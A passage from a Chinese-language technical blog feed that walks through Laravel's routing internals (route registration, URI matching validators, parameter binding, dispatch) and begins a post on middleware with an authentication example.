class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class RouteCollection implements Countable, IteratorAggregate</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="keyword">function</span> add(Route <span class="variable">$route</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;addToCollections(<span class="variable">$route</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$this</span>-&gt;addLookups(<span class="variable">$route</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$route</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        protected <span class="keyword">function</span> addToCollections(<span class="variable">$route</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$domainAndUri</span> = <span class="variable">$route</span>-&gt;getDomain().<span class="variable">$route</span>-&gt;uri();</span><br><span class="line"></span><br><span class="line">            foreach (<span class="variable">$route</span>-&gt;methods() as <span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;routes[<span class="variable">$method</span>][<span class="variable">$domainAndUri</span>] = <span class="variable">$route</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$this</span>-&gt;allRoutes[<span class="variable">$method</span>.<span class="variable">$domainAndUri</span>] = <span class="variable">$route</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        protected <span class="keyword">function</span> addLookups(<span class="variable">$route</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$action</span> = <span class="variable">$route</span>-&gt;getAction();</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> (isset(<span class="variable">$action</span>[<span class="string">'as'</span>])) &#123;</span><br><span class="line">            //如果时命名路由，将route对象映射到以路由名为key的数组值中方便查找</span><br><span class="line">                <span class="variable">$this</span>-&gt;nameList[<span class="variable">$action</span>[<span class="string">'as'</span>]] = <span class="variable">$route</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> (isset(<span class="variable">$action</span>[<span class="string">'controller'</span>])) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;addToActionList(<span class="variable">$action</span>, <span class="variable">$route</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>RouteCollection的四个属性</p><p>routes中存放了HTTP请求方法与路由对象的映射:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line"><span class="string">'GET'</span> =&gt; [</span><br><span class="line"><span class="variable">$routeUri1</span> =&gt; <span class="variable">$routeObj1</span></span><br><span class="line">...</span><br><span class="line">]</span><br><span class="line">...</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>allRoutes属性里存放的内容时将routes属性里的二维数组变成一维数组后的内容:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line"><span class="string">'GET'</span> . <span class="variable">$routeUri1</span> =&gt; <span class="variable">$routeObj1</span></span><br><span class="line"><span class="string">'GET'</span> . <span class="variable">$routeUri2</span> =&gt; <span class="variable">$routeObj2</span></span><br><span class="line">...</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>nameList是路由名称与路由对象的一个映射表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line"><span class="variable">$routeName1</span> =&gt; <span class="variable">$routeObj1</span></span><br><span class="line">...</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>actionList是路由控制器方法字符串与路由对象的映射表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line"><span class="string">'App\Http\Controllers\ControllerOne@ActionOne'</span> =&gt; <span class="variable">$routeObj1</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>这样就算注册好路由了。</p><h3 id="路由寻址"><a href="#路由寻址" class="headerlink" title="路由寻址"></a>路由寻址</h3><p>在后面中间件的文章里我们看到HTTP请求是在经过Pipeline通道上的中间件的前置操作后到达目的地:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Illuminate\Foundation\Http\Kernel</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kernel</span> <span class="keyword">implements</span> <span class="title">KernelContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">sendRequestThroughRouter</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">        Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;bootstrap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;app))</span><br><span class="line">                    -&gt;send($request)</span><br><span class="line">                    -&gt;through(<span class="keyword">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="keyword">$this</span>-&gt;middleware)</span><br><span class="line">                    -&gt;then(<span class="keyword">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRouter</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码可以看到Pipeline的destination就是dispatchToRouter函数返回的闭包:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$destination = <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在闭包里调用了router的dispatch方法，路由寻址就发生在dispatch的第一个阶段findRoute里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span> <span class="keyword">implements</span> <span class="title">RegistrarContract</span>, <span class="title">BindingRegistrar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;currentRequest = $request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToRoute($request);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRoute</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runRoute($request, <span class="keyword">$this</span>-&gt;findRoute($request));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">findRoute</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;current = $route = <span class="keyword">$this</span>-&gt;routes-&gt;match($request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;container-&gt;instance(Route::class, $route);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $route;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找路由的任务由 RouteCollection 负责，这个函数负责匹配路由，并且把 request 的 url 参数绑定到路由中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouteCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">IteratorAggregate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">match</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $routes = <span class="keyword">$this</span>-&gt;get($request-&gt;getMethod());</span><br><span class="line"></span><br><span class="line">        $route = <span class="keyword">$this</span>-&gt;matchAgainstRoutes($routes, $request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_null($route)) &#123;</span><br><span class="line">            <span class="comment">//找到匹配的路由后，将URI里的路径参数绑定赋值给路由(如果有的话)</span></span><br><span class="line">            <span class="keyword">return</span> $route-&gt;bind($request);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $others = <span class="keyword">$this</span>-&gt;checkForAlternateVerbs($request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (count($others) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getRouteForMethods($request, $others);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundHttpException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">matchAgainstRoutes</span><span class="params">(array $routes, $request, $includingMethod = true)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Arr::first($routes, <span class="function"><span class="keyword">function</span> <span class="params">($value)</span> <span class="title">use</span> <span class="params">($request, $includingMethod)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $value-&gt;matches($request, $includingMethod);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">matches</span><span class="params">(Request $request, $includingMethod = true)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;compileRoute();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getValidators() <span class="keyword">as</span> $validator) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! $includingMethod &amp;&amp; $validator <span class="keyword">instanceof</span> MethodValidator) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! $validator-&gt;matches(<span class="keyword">$this</span>, $request)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$routes = $this-&gt;get($request-&gt;getMethod());</code>会先加载注册路由阶段在RouteCollection里生成的routes属性里的值，routes中存放了HTTP请求方法与路由对象的映射。</p><p>然后依次调用这堆路由里路由对象的matches方法， matches方法, matches方法里会对HTTP请求对象进行一些验证，验证对应的Validator是：UriValidator、MethodValidator、SchemeValidator、HostValidator。<br>在验证之前在<code>$this-&gt;compileRoute()</code>里会将路由的规则转换成正则表达式。</p><p>UriValidator主要是看请求对象的URI是否与路由的正则规则匹配能匹配上:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UriValidator</span> <span class="keyword">implements</span> <span class="title">ValidatorInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">matches</span><span class="params">(Route $route, Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path = $request-&gt;path() == <span class="string">'/'</span> ? <span class="string">'/'</span> : <span class="string">'/'</span>.$request-&gt;path();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> preg_match($route-&gt;getCompiled()-&gt;getRegex(), rawurldecode($path));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MethodValidator验证请求方法, SchemeValidator验证协议是否正确(http|https), HostValidator验证域名, 如果路由中不设置host属性，那么这个验证不会进行。</p><p>一旦某个路由通过了全部的认证就将会被返回，接下来就要将请求对象URI里的路径参数绑定复制给路由参数:</p><h3 id="路由参数绑定"><a href="#路由参数绑定" class="headerlink" title="路由参数绑定"></a>路由参数绑定</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;compileRoute();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;parameters = (<span class="keyword">new</span> RouteParameterBinder(<span class="keyword">$this</span>))</span><br><span class="line">                        -&gt;parameters($request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RouteParameterBinder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parameters</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $parameters = <span class="keyword">$this</span>-&gt;bindPathParameters($request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_null(<span class="keyword">$this</span>-&gt;route-&gt;compiled-&gt;getHostRegex())) &#123;</span><br><span class="line">            $parameters = <span class="keyword">$this</span>-&gt;bindHostParameters(</span><br><span class="line">                $request, $parameters</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;replaceDefaults($parameters);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindPathParameters</span><span class="params">($request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            preg_match(<span class="keyword">$this</span>-&gt;route-&gt;compiled-&gt;getRegex(), <span class="string">'/'</span>.$request-&gt;decodedPath(), $matches);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;matchToKeys(array_slice($matches, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">matchToKeys</span><span class="params">(array $matches)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($parameterNames = <span class="keyword">$this</span>-&gt;route-&gt;parameterNames())) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parameters = array_intersect_key($matches, array_flip($parameterNames));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> array_filter($parameters, <span class="function"><span class="keyword">function</span> <span class="params">($value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> is_string($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>赋值路由参数完成后路由寻址的过程就结束了，结下来就该运行通过匹配路由中对应的控制器方法返回响应对象了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span> <span class="keyword">implements</span> <span class="title">RegistrarContract</span>, <span class="title">BindingRegistrar</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;currentRequest = $request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToRoute($request);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToRoute</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runRoute($request, <span class="keyword">$this</span>-&gt;findRoute($request));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRoute</span><span class="params">(Request $request, Route $route)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $request-&gt;setRouteResolver(<span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $route;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">new</span> Events\RouteMatched($route, $request));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse($request,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;runRouteWithinStack($route, $request)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runRouteWithinStack</span><span class="params">(Route $route, Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $shouldSkipMiddleware = <span class="keyword">$this</span>-&gt;container-&gt;bound(<span class="string">'middleware.disable'</span>) &amp;&amp;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;container-&gt;make(<span class="string">'middleware.disable'</span>) === <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">//收集路由和控制器里应用的中间件</span></span><br><span class="line">        $middleware = $shouldSkipMiddleware ? [] : <span class="keyword">$this</span>-&gt;gatherRouteMiddleware($route);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> Pipeline(<span class="keyword">$this</span>-&gt;container))</span><br><span class="line">                    -&gt;send($request)</span><br><span class="line">                    -&gt;through($middleware)</span><br><span class="line">                    -&gt;then(<span class="function"><span class="keyword">function</span> <span class="params">($request)</span> <span class="title">use</span> <span class="params">($route)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareResponse(</span><br><span class="line">                            $request, $route-&gt;run()</span><br><span class="line">                        );</span><br><span class="line">                    &#125;);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Route</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;container = <span class="keyword">$this</span>-&gt;container ?: <span class="keyword">new</span> Container;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isControllerAction()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runController();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;runCallable();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (HttpResponseException $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> $e-&gt;getResponse();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要介绍路由相关的内容，runRoute的过程通过上面的源码可以看到其实也很复杂， 会收集路由和控制器里的中间件，将请求通过中间件过滤才会最终到达目的地路由，执行目的路由地<code>run()</code>方法，里面会判断路由对应的是一个控制器方法还是闭包然后进行相应地调用，最后把执行结果包装成Response对象返回给客户端</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之中间件</title>
      <link href="/2018/10/14/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2018/10/14/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>重要的中间件了解一下<br><a id="more"></a></p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><h2 id="中间件的好处"><a href="#中间件的好处" class="headerlink" title="中间件的好处"></a>中间件的好处</h2><p>中间件(Middleware)在Laravel中起着过滤进入应用的HTTP请求对象(Request)和完善离开应用的HTTP响应对象(Reponse)的作用, 而且可以通过应用多个中间件来层层过滤请求、逐步完善相应。这样就做到了程序的解耦，如果没有中间件那么我们必须在控制器中来完成这些步骤，这无疑会造成控制器的臃肿。</p><p>举一个简单的例子，在一个电商平台上用户既可以是一个普通用户在平台上购物也可以在开店后是一个卖家用户，这两种用户的用户体系往往都是一套，那么在只有卖家用户才能访问的控制器里我们只需要应用两个中间件来完成卖家用户的身份认证：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MerchantController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">this</span>-&gt;middleware(<span class="symbol">'aut</span>h');</span><br><span class="line">$<span class="keyword">this</span>-&gt;middleware(<span class="symbol">'mechatnt_aut</span>h');</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在auth中间件里做了通用的用户认证，成功后HTTP Request会走到merchant_auth中间件里进行商家用户信息的认证，两个中间件都通过后HTTP Request就能进入到要去的控制器方法中了。利用中间件，我们就能把这些认证代码抽离到对应的中间件中了，而且可以根据需求自由组合多个中间件来对HTTP 